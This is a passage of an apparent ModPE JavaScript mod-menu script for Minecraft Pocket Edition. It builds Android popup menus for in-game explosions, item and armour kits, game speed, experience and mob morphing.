		g_exit.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
             nmenu.dismiss();
showMenuBtn();
			}
		});
		nmenuLayout.addView(g_exit);

var n1 = new Button(ctx);
            n1.setText("Nuke 1%");  
            n1.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         explode(getPlayerX(),getPlayerY(),getPlayerZ(),1);
                }
            }));
            nmenuLayout.addView(n1);

     var n2 = new Button(ctx);
            n2.setText("Nuke 5%");
            n2.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         explode(getPlayerX(),getPlayerY(),getPlayerZ(),5);
                }
            }));
            nmenuLayout.addView(n2);

var n3 = new Button(ctx);
            n3.setText("Nuke 10%");
            n3.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         explode(getPlayerX(),getPlayerY(),getPlayerZ(),10);
                }
            }));
            nmenuLayout.addView(n3);

var n4 = new Button(ctx);
            n4.setText("Nuke 15%");
            n4.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         explode(getPlayerX(),getPlayerY(),getPlayerZ(),15);
                }
            }));
            nmenuLayout.addView(n4);

var n5 = new Button(ctx);
            n5.setText("Nuke 20%");
            n5.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         explode(getPlayerX(),getPlayerY(),getPlayerZ(),20);
                }
            }));
            nmenuLayout.addView(n5);

var n6 = new Button(ctx);
            n6.setText("Nuke 25%");
            n6.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         explode(getPlayerX(),getPlayerY(),getPlayerZ(),25);
                }
            }));
            nmenuLayout.addView(n6);

var n7 = new Button(ctx);
            n7.setText("Nuke 30%");
            n7.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         explode(getPlayerX(),getPlayerY(),getPlayerZ(),30);
                }
            }));
            nmenuLayout.addView(n7);

var n8 = new Button(ctx);
            n8.setText("Nuke 35%");
            n8.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         explode(getPlayerX(),getPlayerY(),getPlayerZ(),35);
                }
            }));
            nmenuLayout.addView(n8);

var n9 = new Button(ctx);
            n9.setText("Nuke 40%");
            n9.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         explode(getPlayerX(),getPlayerY(),getPlayerZ(),40);
                }
            }));
            nmenuLayout.addView(n9);

var n10 = new Button(ctx);
            n10.setText("Nuke 45%");
            n10.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         explode(getPlayerX(),getPlayerY(),getPlayerZ(),45);
                }
            }));
            nmenuLayout.addView(n10);

var n11 = new Button(ctx);
            n11.setText("Nuke 50%");
            n11.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         explode(getPlayerX(),getPlayerY(),getPlayerZ(),50);
                }
            }));
            nmenuLayout.addView(n11);
		
		var h_exit = new android.widget.Button(ctx);
		h_exit.setText("Exit");
		h_exit.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
             nmenu.dismiss();
showMenuBtn();
			}
		});
		nmenuLayout.addView(h_exit);

            nmenu = new PopupWindow(nmenuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/3, ctx.getWindowManager().getDefaultDisplay().getHeight());
            nmenu.setBackgroundDrawable(new ColorDrawable(GUIColor));
            nmenu.showAtLocation(ctx.getWindow().getDecorView(), GUIPos | Gravity.TOP, 0, 0);
            }catch(error){
                Toast.makeText(ctx, "An error occured: " + error, 1).show();
            }
    }}));
}

function GiveMenu() {
ctx.runOnUiThread(new java.lang.Runnable({ run: function(){
        try{
            var gmenuLayout = new android.widget.LinearLayout(ctx);
            var gmenuScroll = new android.widget.ScrollView(ctx);
            var gmenuLayout1 = new android.widget.LinearLayout(ctx);
            gmenuLayout.setOrientation(1);
            gmenuLayout1.setOrientation(1);

            gmenuScroll.addView(gmenuLayout);
            gmenuLayout1.addView(gmenuScroll);


var MainTitle = new android.widget.TextView(ctx); MainTitle.setGravity(android.view.Gravity.CENTER);
		MainTitle.setText(name + space + version);
       MainTitle.setTextColor(GUIName);
		MainTitle.setTextSize(20);
		gmenuLayout.addView(MainTitle);

var gtitle = new android.widget.TextView(ctx); gtitle.setGravity(android.view.Gravity.CENTER);
		gtitle.setText("Give Menu");
       gtitle.setTextColor(GUIName);
		gtitle.setTextSize(20);
		gmenuLayout.addView(gtitle);

            var button = new android.widget.Button(ctx);
            button.setText("Custom Give");
            button.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
MGive();
gmenu.dismiss();
                }
            }));
            gmenuLayout.addView(button);

var button90 = new android.widget.Button(ctx);
            button90.setText("Item ID list");
            button90.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
idList(); 
                }
            }));
            gmenuLayout.addView(button90);

function idList()
      {
      ctx.runOnUiThread(new java.lang.Runnable({run: function(){
      var webs = new android.webkit.WebView(ctx);
      var webset = webs.getSettings();
      webset.setJavaScriptEnabled(true);
      webs.setWebChromeClient(new android.webkit.WebChromeClient());
      webs.setWebViewClient(new android.webkit.WebViewClient());
      webs.loadUrl('http://www.minecraftinfo.com/idlist.html');
/*Site URL*/
      new android.app.AlertDialog.Builder(ctx).setView(webs).show();
      }}));
      }

var butto = new android.widget.Button(ctx);
            butto.setText("Special creative inventory");
            butto.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
 clientMessage(client + "§7Adding all items to creative inventory");
for(var j = 0; j < 500; j++) {
Player.addItemCreativeInv(j, 5, 0);
}
if(j==500)clientMessage(client + "§7Done, all items added.");
                }
            }));
            gmenuLayout.addView(butto);

var k1 = new android.widget.Button(ctx);
            k1.setText("Leather kit");
            k1.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
Player.setArmorSlot(0, 298, 0);
Player.setArmorSlot(1, 299, 0);
Player.setArmorSlot(2, 300, 0);
Player.setArmorSlot(3, 301, 0);
clientMessage("§6Leather §fkit equipped check inventory!");
addItemInventory(268, 1, 0);
addItemInventory(269, 1, 0);
addItemInventory(270, 1, 0);
addItemInventory(271, 1, 0);
addItemInventory(290, 1, 0);
                }
            }));
            gmenuLayout.addView(k1);

var k2 = new android.widget.Button(ctx);
            k2.setText("Chain kit");
            k2.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
Player.setArmorSlot(0, 302, 0);
Player.setArmorSlot(1, 303, 0);
Player.setArmorSlot(2, 304, 0);
Player.setArmorSlot(3, 305, 0);
clientMessage("§7Chain §fkit equipped check inventory!");
addItemInventory(272, 1, 0);
addItemInventory(273, 1, 0);
addItemInventory(274, 1, 0);
addItemInventory(275, 1, 0);
addItemInventory(291, 1, 0);
                }
            }));
            gmenuLayout.addView(k2);

var k3 = new android.widget.Button(ctx);
            k3.setText("Iron kit");
            k3.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
Player.setArmorSlot(0, 306, 0);
Player.setArmorSlot(1, 307, 0);
Player.setArmorSlot(2, 308, 0);
Player.setArmorSlot(3, 309, 0);
clientMessage("§fIron §fkit equipped check inventory!");
addItemInventory(267, 1, 0);
addItemInventory(256, 1, 0);
addItemInventory(257, 1, 0);
addItemInventory(258, 1, 0);
addItemInventory(292, 1, 0);
                }
            }));
            gmenuLayout.addView(k3);

var k4 = new android.widget.Button(ctx);
            k4.setText("Gold kit");
            k4.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
Player.setArmorSlot(0, 314, 0);
Player.setArmorSlot(1, 315, 0);
Player.setArmorSlot(2, 316, 0);
Player.setArmorSlot(3, 317, 0);
clientMessage("§eGold §fkit equipped check inventory!");
addItemInventory(283, 1, 0);
addItemInventory(284, 1, 0);
addItemInventory(285, 1, 0);
addItemInventory(286, 1, 0);
addItemInventory(294, 1, 0);
                }
            }));
            gmenuLayout.addView(k4);

var k5 = new android.widget.Button(ctx);
            k5.setText("Diamond kit");
            k5.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
Player.setArmorSlot(0, 310, 0);
Player.setArmorSlot(1, 311, 0);
Player.setArmorSlot(2, 312, 0);
Player.setArmorSlot(3, 313, 0);
clientMessage("§bDiamond §fkit equipped check inventory!");
addItemInventory(276, 1, 0);
addItemInventory(277, 1, 0);
addItemInventory(278, 1, 0);
addItemInventory(279, 1, 0);
addItemInventory(293, 1, 0);
                }
            }));
            gmenuLayout.addView(k5);

var gg_exit = new android.widget.Button(ctx);
		gg_exit.setText("Exit");
		gg_exit.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
             gmenu.dismiss();
showMenuBtn();
print("Loading web page");
			}
		});
		gmenuLayout.addView(gg_exit);

            gmenu = new android.widget.PopupWindow(gmenuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/2, ctx.getWindowManager().getDefaultDisplay().getHeight());
          /*  gmenu.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.GUIColor));*/
gmenu.setBackgroundDrawable(new ColorDrawable(GUIColor));
            gmenu.showAtLocation(ctx.getWindow().getDecorView(), GUIPos | android.view.Gravity.TOP, 0, 0);
        }catch(error){
            print("A Error Has Happen: " + error);
        }
    }}));
}

function MGive() {
ctx.runOnUiThread(new java.lang.Runnable(){
run: function(){ 
try{
GetText = new android.widget.PopupWindow();
var Layer = new android.widget.LinearLayout(ctx);
var ID = new android.widget.EditText(ctx);
var Amount = new android.widget.EditText(ctx);
var Damage = new android.widget.EditText(ctx);
var Dialog = new android.app.Dialog(ctx);
var Exit = new android.widget.Button(ctx);

Dialog.setTitle("Enter ID,Amt,Dmg");
Dialog.setContentView(Layer);

Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
Dialog.show();
Layer.addView(ID);
Layer.addView(Amount);
Layer.addView(Damage);
Layer.addView(Exit);

ID.setText("");
ID.setHint("Item ID");
Amount.setText("");
Amount.setHint("Item Amount");
Damage.setText("");
Damage.setHint("Item Damage");
Exit.setText("GET items");

Exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(view){
I=ID.getText();
A=Amount.getText();
D=Damage.getText();
Dialog.dismiss();
GG();
showMenuBtn();
}
});

GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (e){
print("The Give Dialog Is Malfunctioning:"+e);
}
}});
}

function GG() {
Player.addItemInventory(I,A,D);
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/give " + Player.getName(Player.getEntity()) + space + I + ":" + D + space + A);
}

function dmenu_menu(){
ctx.runOnUiThread(new Runnable({ run: function(){
        try{
            var dmenuLayout = new LinearLayout(ctx);
            var dmenuScroll = new ScrollView(ctx);
            var dmenuLayout1 = new LinearLayout(ctx);
            dmenuLayout.setOrientation(1);
            dmenuLayout1.setOrientation(1);
            dmenuScroll.addView(dmenuLayout);
            dmenuLayout1.addView(dmenuScroll);

var MainTitle = new android.widget.TextView(ctx); MainTitle.setGravity(android.view.Gravity.CENTER);
		MainTitle.setText(name + space + version);
       MainTitle.setTextColor(GUIName);
		MainTitle.setTextSize(20);
		dmenuLayout.addView(MainTitle);
            
            var title = new android.widget.TextView(ctx); title.setGravity(android.view.Gravity.CENTER);
		title.setText("Speed Menu");
       title.setTextColor(GUIName);
		title.setTextSize(20);
		dmenuLayout.addView(title);

var exit = new android.widget.Button(ctx);
		exit.setText("Exit");
		exit.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
             dmenu.dismiss();
showMenuBtn();
			}
		});
		dmenuLayout.addView(exit);

var d1 = new Button(ctx);
            d1.setText("Normal speed");       
            d1.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
                	ModPE.setGameSpeed(20);
                }
            }));
            dmenuLayout.addView(d1);
            
            var d2 = new Button(ctx);
            d2.setText("Speed 5%");       
            d2.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
                	ModPE.setGameSpeed(25);
                }
            }));
            dmenuLayout.addView(d2);
            
            var d3 = new Button(ctx);
            d3.setText("Speed 10%");       
            d3.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
                	ModPE.setGameSpeed(30);
                }
            }));
            dmenuLayout.addView(d3);
            
            var d4 = new Button(ctx);
            d4.setText("Speed 15%");       
            d4.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
                	ModPE.setGameSpeed(35);
                }
            }));
            dmenuLayout.addView(d4);
            
            var d5 = new Button(ctx);
            d5.setText("Speed 20%");       
            d5.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
                	ModPE.setGameSpeed(40);
                }
            }));
            dmenuLayout.addView(d5);
            
            var d6 = new Button(ctx);
            d6.setText("Speed 25%");       
            d6.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
                	ModPE.setGameSpeed(45);
                }
            }));
            dmenuLayout.addView(d6);
            
            var d7 = new Button(ctx);
            d7.setText("Speed 30%");       
            d7.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
                	ModPE.setGameSpeed(50);
                }
            }));
            dmenuLayout.addView(d7);
            
            var d8 = new Button(ctx);
            d8.setText("Speed 35%");       
            d8.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
                	ModPE.setGameSpeed(55);
                }
            }));
            dmenuLayout.addView(d8);
            
            var d9 = new Button(ctx);
            d9.setText("Speed 40%");       
            d9.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
                	ModPE.setGameSpeed(60);
                }
            }));
            dmenuLayout.addView(d9);

var d10 = new Button(ctx);
            d10.setText("Speed 45%");       
            d10.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
                	ModPE.setGameSpeed(65);
                }
            }));
            dmenuLayout.addView(d10);

var d11 = new Button(ctx);
            d11.setText("Speed 50%");       
            d11.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
                	ModPE.setGameSpeed(70);
                }
            }));
            dmenuLayout.addView(d11);
		
		var exit2 = new android.widget.Button(ctx);
		exit2.setText("Exit");
		exit2.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
             dmenu.dismiss();
showMenuBtn();
			}
		});
		dmenuLayout.addView(exit2);

            dmenu = new PopupWindow(dmenuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/3, ctx.getWindowManager().getDefaultDisplay().getHeight());
            dmenu.setBackgroundDrawable(new ColorDrawable(GUIColor));
            dmenu.showAtLocation(ctx.getWindow().getDecorView(), GUIPos | Gravity.TOP, 0, 0);
            }catch(error){
                Toast.makeText(ctx, "An error occured: " + error, 1).show();
            }
    }}));
}

function ExMenu() {
ctx.runOnUiThread(new java.lang.Runnable({ run: function(){
        try{
            var xmenuLayout = new android.widget.LinearLayout(ctx);
            var xmenuScroll = new android.widget.ScrollView(ctx);
            var xmenuLayout1 = new android.widget.LinearLayout(ctx);
            xmenuLayout.setOrientation(1);
            xmenuLayout1.setOrientation(1);

            xmenuScroll.addView(xmenuLayout);
            xmenuLayout1.addView(xmenuScroll);

var MainTitle = new android.widget.TextView(ctx); MainTitle.setGravity(android.view.Gravity.CENTER);
		MainTitle.setText(name + space + version);
       MainTitle.setTextColor(GUIName);
		MainTitle.setTextSize(20);
		xmenuLayout.addView(MainTitle);

var xtitle = new android.widget.TextView(ctx); xtitle.setGravity(android.view.Gravity.CENTER);
		xtitle.setText("Experience Menu");
       xtitle.setTextColor(GUIName);
		xtitle.setTextSize(20);
		xmenuLayout.addView(xtitle);

            var button = new android.widget.Button(ctx);
            button.setText("Add experience");
            button.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
XGive();
xmenu.dismiss();
                }
            }));
            xmenuLayout.addView(button);

var rr_exit = new android.widget.Button(ctx);
		rr_exit.setText("Exit");
	   rr_exit.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
             xmenu.dismiss();
showMenuBtn();
			}
		});
		xmenuLayout.addView(rr_exit);

            xmenu = new android.widget.PopupWindow(xmenuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/2, ctx.getWindowManager().getDefaultDisplay().getHeight());
        /*    xmenu.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.GUIColor));*/
xmenu.setBackgroundDrawable(new ColorDrawable(GUIColor));
            xmenu.showAtLocation(ctx.getWindow().getDecorView(), GUIPos | android.view.Gravity.TOP, 0, 0);
        }catch(error){
            print("A Error Has Happen: " + error);
        }
    }}));
}

function XGive() {
ctx.runOnUiThread(new java.lang.Runnable(){
run: function(){ 
try{
GetText = new android.widget.PopupWindow();
var Layer = new android.widget.LinearLayout(ctx);
var XP = new android.widget.EditText(ctx);
var Dialog = new android.app.Dialog(ctx);
var Exit = new android.widget.Button(ctx);

Dialog.setTitle("Enter XP Amount");
Dialog.setContentView(Layer);

Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
Dialog.show();
Layer.addView(XP);
Layer.addView(Exit);

XP.setText("");
XP.setHint("EXP");
Exit.setText("GET exp");

Exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(view){
L=XP.getText();
Dialog.dismiss();
XG();
showMenuBtn();
}
});

GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (e){
print("The XP Dialog Is Malfunctioning:"+e);
}
}});
}

function XG() {
Player.setExp(Math.round(L));
Player.addExp(Math.round(L));
}

function mMenu(){
ctx.runOnUiThread(new Runnable({ run: function(){
        try{
            var mmenuLayout = new LinearLayout(ctx);
            var mmenuScroll = new ScrollView(ctx);
            var mmenuLayout1 = new LinearLayout(ctx);
            mmenuLayout.setOrientation(1);
            mmenuLayout1.setOrientation(1);
            mmenuScroll.addView(mmenuLayout);
            mmenuLayout1.addView(mmenuScroll);

var MainTitle = new android.widget.TextView(ctx); MainTitle.setGravity(android.view.Gravity.CENTER);
		MainTitle.setText(name + space + version);
       MainTitle.setTextColor(GUIName);
		MainTitle.setTextSize(20);
		mmenuLayout.addView(MainTitle);
            
            var T_title = new android.widget.TextView(ctx); T_title.setGravity(android.view.Gravity.CENTER);
		T_title.setText("Morph Menu");
       T_title.setTextColor(GUIName);
		T_title.setTextSize(20);
		mmenuLayout.addView(T_title);

var A_exit = new android.widget.Button(ctx);
		A_exit.setText("Exit");
		A_exit.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
             mmenu.dismiss();
			}
		});
		mmenuLayout.addView(A_exit);

var mm1 = new android.widget.Button(ctx);
            mm1.setText("Player");
            mm1.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
Entity.setCollisionSize(Player.getEntity(), 0.5, 2, 0.5);
Entity.setRenderType(Player.getEntity(), EntityRenderType.player);
			Entity.setMobSkin(Player.getEntity(),"mob/char.png");
                }
            }));
            mmenuLayout.addView(mm1);

var mm = new android.widget.Button(ctx);
            mm.setText("Bat");
            mm.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
Entity.setCollisionSize(Player.getEntity(), 0.2, 0.2, 0.2);

Entity.setRenderType(Player.getEntity(), EntityRenderType.bat);
			Entity.setMobSkin(Player.getEntity(),"mob/bat.png");
                }
            }));
            mmenuLayout.addView(mm);

var mm0 = new android.widget.Button(ctx);
            mm0.setText("Blaze");
            mm0.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
Entity.setCollisionSize(Player.getEntity(), 0.5, 2, 0.5);
Entity.setRenderType(Player.getEntity(), EntityRenderType.blaze);
			Entity.setMobSkin(Player.getEntity(),"mob/blaze.png");
                }
            }));
            mmenuLayout.addView(mm0);

var mm2 = new android.widget.Button(ctx);
            mm2.setText("Chicken");
            mm2.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
Entity.setCollisionSize(Player.getEntity(), 0.4, 0.4, 0.4);

Entity.setRenderType(Player.getEntity(), EntityRenderType.chicken);
			Entity.setMobSkin(Player.getEntity(),"mob/chicken.png");
                }
            }));
            mmenuLayout.addView(mm2);

var mm3 = new android.widget.Button(ctx);
            mm3.setText("Cow");
            mm3.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
Entity.setCollisionSize(Player.getEntity(), 0.8, 1.7, 0.8);

Entity.setRenderType(Player.getEntity(), EntityRenderType.cow);
			Entity.setMobSkin(Player.getEntity(),"mob/cow.png");
                }
            }));
            mmenuLayout.addView(mm3);

var mm4 = new android.widget.Button(ctx);
            mm4.setText("Creeper");
            mm4.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
Entity.setCollisionSize(Player.getEntity(), 0.5, 2, 0.5);

Entity.setRenderType(Player.getEntity(), EntityRenderType.creeper);
			Entity.setMobSkin(Player.getEntity(),"mob/creeper.png");
                }
            }));
            mmenuLayout.addView(mm4);

var mm5 = new android.widget.Button(ctx);
            mm5.setText("Enderman");
            mm5.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
Entity.setCollisionSize(Player.getEntity(), 0.7, 3, 0.7);
Entity.setRenderType(Player.getEntity(), EntityRenderType.enderman);
			Entity.setMobSkin(Player.getEntity(),"mob/enderman.tga");
                }
            }));
            mmenuLayout.addView(mm5);

var mm6 = new android.widget.Button(ctx);
            mm6.setText("Ghast");
            mm6.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
Entity.setCollisionSize(Player.getEntity(), 4, 4, 4);

Entity.setRenderType(Player.getEntity(), EntityRenderType.ghast);
			Entity.setMobSkin(Player.getEntity(),"mob/ghast.png");
                }
            }));
            mmenuLayout.addView(mm6);

var mm7 = new android.widget.Button(ctx);
            mm7.setText("Iron golem");
            mm7.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
Entity.setCollisionSize(Player.getEntity(), 1, 3, 1);
Entity.setRenderType(Player.getEntity(), EntityRenderType.ironGolem);
			Entity.setMobSkin(Player.getEntity(),"mob/iron_golem.png");
                }
            }));
            mmenuLayout.addView(mm7);

var mm8 = new android.widget.Button(ctx);
            mm8.setText("Lava slime");
            mm8.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
Entity.setCollisionSize(Player.getEntity(), 2, 2, 2);

Entity.setRenderType(Player.getEntity(), EntityRenderType.lavaSlime);
			Entity.setMobSkin(Player.getEntity(),"mob/magmacube.png");
                }
            }));
            mmenuLayout.addView(mm8);

var mm9 = new android.widget.Button(ctx);
            mm9.setText("Ocelot");
            mm9.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
Entity.setCollisionSize(Player.getEntity(), 0.5, 0.5, 0.5);
Entity.setRenderType(Player.getEntity(), EntityRenderType.ocelot);
			Entity.setMobSkin(Player.getEntity(),"mob/cat/ocelot.png");
                }
            }));
            mmenuLayout.addView(mm9);

var mm10 = new android.widget.Button(ctx);
            mm10.setText("Pig");
            mm10.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
Entity.setCollisionSize(Player.getEntity(), 0.8, 1, 0.8);

POTION()
Entity.setRenderType(Player.getEntity(), EntityRenderType.pig);
			Entity.setMobSkin(Player.getEntity(),"mob/pig.png");
                }
            }));
            mmenuLayout.addView(mm10);

var mm11 = new android.widget.Button(ctx);
            mm11.setText("Sheep");
            mm11.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
Entity.setCollisionSize(Player.getEntity(), 0.8, 1.7, 0.8);

Entity.setRenderType(Player.getEntity(), EntityRenderType.sheep);
			Entity.setMobSkin(Player.getEntity(),"mob/sheep.tga");
                }
            }));
            mmenuLayout.addView(mm11);

var mm12 = new android.widget.Button(ctx);
            mm12.setText("Silverfish");
            mm12.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
Entity.setCollisionSize(Player.getEntity(), 0.3, 0.4, 0.3);

Entity.setRenderType(Player.getEntity(), EntityRenderType.silverfish);
			Entity.setMobSkin(Player.getEntity(),"mob/silverfish.png");
                }
            }));
            mmenuLayout.addView(mm12);

var mm13 = new android.widget.Button(ctx);
            mm13.setText("Skeleton");
            mm13.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
Entity.setCollisionSize(Player.getEntity(), 0.5, 2, 0.5);

Entity.setRenderType(Player.getEntity(), EntityRenderType.skeleton);
			Entity.setMobSkin(Player.getEntity(),"mob/skeleton.png");
                }
            }));
            mmenuLayout.addView(mm13);

var mm14 = new android.widget.Button(ctx);
            mm14.setText("Slime");
            mm14.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
Entity.setCollisionSize(Player.getEntity(), 2, 2, 2);

Entity.setRenderType(Player.getEntity(), EntityRenderType.slime);
			Entity.setMobSkin(Player.getEntity(),"mob/slime.png");
                }
            }));
            mmenuLayout.addView(mm14);

var mm15 = new android.widget.Button(ctx);
            mm15.setText("Snow golem");
            mm15.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
Entity.setCollisionSize(Player.getEntity(), 0.7, 2, 0.7);
Entity.setRenderType(Player.getEntity(), EntityRenderType.snowGolem);
			Entity.setMobSkin(Player.getEntity(),"mob/snow_golem.png");
                }
            }));
            mmenuLayout.addView(mm15);

var mm16 = new android.widget.Button(ctx);
            mm16.setText("Spider");
            mm16.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
Entity.setCollisionSize(Player.getEntity(), 1, 0.4, 1);

Entity.setRenderType(Player.getEntity(), EntityRenderType.spider);
			Entity.setMobSkin(Player.getEntity(),"mob/spider.tga");
                }
            }));
            mmenuLayout.addView(mm16);

var mm17 = new android.widget.Button(ctx);
            mm17.setText("Squid");
            mm17.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
Entity.setCollisionSize(Player.getEntity(), 0.5, 0.5, 0.5);

Entity.setRenderType(Player.getEntity(), EntityRenderType.squid);
			Entity.setMobSkin(Player.getEntity(),"mob/squid.png");
                }
            }));
            mmenuLayout.addView(mm17);

var mm18 = new android.widget.Button(ctx);
            mm18.setText("Villager");
            mm18.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
Entity.setCollisionSize(Player.getEntity(), 0.5, 2, 0.5);
                Entity.setRenderType(Player.getEntity(), EntityRenderType.villager);
			Entity.setMobSkin(Player.getEntity(),"mob/villager/villager.png");
                }
            }));
            mmenuLayout.addView(mm18);

var mm19 = new android.widget.Button(ctx);
            mm19.setText("Villager zombie");
            mm19.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
Entity.setCollisionSize(Player.getEntity(), 0.5, 2, 0.5);

Entity.setRenderType(Player.getEntity(), EntityRenderType.zombieVillager);
			Entity.setMobSkin(Player.getEntity(),"mob/zombieVillager.png");
                }
            }));
            mmenuLayout.addView(mm19);

var mm20 = new android.widget.Button(ctx);
            mm20.setText("Wolf");
            mm20.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
Entity.setCollisionSize(Player.getEntity(), 0.8, 0.7, 0.8);

Entity.setRenderType(Player.getEntity(), EntityRenderType.wolf);
			Entity.setMobSkin(Player.getEntity(),"mob/wolf.png");
                }
            }));
            mmenuLayout.addView(mm20);

var mm21 = new android.widget.Button(ctx);
            mm21.setText("Zombie");
            mm21.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
Entity.setCollisionSize(Player.getEntity(), 0.5, 2, 0.5);

Entity.setRenderType(Player.getEntity(), EntityRenderType.zombie);
			Entity.setMobSkin(Player.getEntity(),"mob/zombie.png");
                }
            }));
            mmenuLayout.addView(mm21);

var mm22 = new android.widget.Button(ctx);
            mm22.setText("Zombie pigman");
            mm22.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
Entity.setCollisionSize(Player.getEntity(), 0.5, 2, 0.5);

Entity.setRenderType(Player.getEntity(), EntityRenderType.zombie);
			Entity.setMobSkin(Player.getEntity(),"mob/pigzombie.png");
                }
            }));
            mmenuLayout.addView(mm22);

		var B_exit = new android.widget.Button(ctx);
		B_exit.setText("Exit");
		B_exit.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
             mmenu.dismiss();
			}
		});
		mmenuLayout.addView(B_exit);

            mmenu = new PopupWindow(mmenuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/3, ctx.getWindowManager().getDefaultDisplay().getHeight());
            mmenu.setBackgroundDrawable(new ColorDrawable(GUIColor));
            mmenu.showAtLocation(ctx.getWindow().getDecorView(), GUIPos | Gravity.TOP, 0, 0);
            }catch(error){
                Toast.makeText(ctx, "An error occured: " + error, 1).show();
            }
    }}));
}


function WaMenu() {
ctx.runOnUiThread(new java.lang.Runnable({ run: function(){
        try{
            var wmenuLayout = new android.widget.LinearLayout(ctx);
            var wmenuScroll = new android.widget.ScrollView(ctx);
            var wmenuLayout1 = new android.widget.LinearLayout(ctx);
            wmenuLayout.setOrientation(1);
            wmenuLayout1.setOrientation(1);

            wmenuScroll.addView(wmenuLayout);
            wmenuLayout1.addView(wmenuScroll);

var MainTitle = new android.widget.TextView(ctx); MainTitle.setGravity(android.view.Gravity.CENTER);
		MainTitle.setText(name + space + version);
       MainTitle.setTextColor(GUIName);
		MainTitle.setTextSize(20);
		wmenuLayout.addView(MainTitle);

var wtitle = new android.widget.TextView(ctx); wtitle.setGravity(android.view.Gravity.CENTER);
		wtitle.setText("Weather Menu");
       wtitle.setTextColor(GUIName);
		wtitle.setTextSize(20);
		wmenuLayout.addView(wtitle);

            var button = new android.widget.Button(ctx);
            button.setText("Set wether");
            button.setOnClickListener(new android.view.View.OnClickListener({
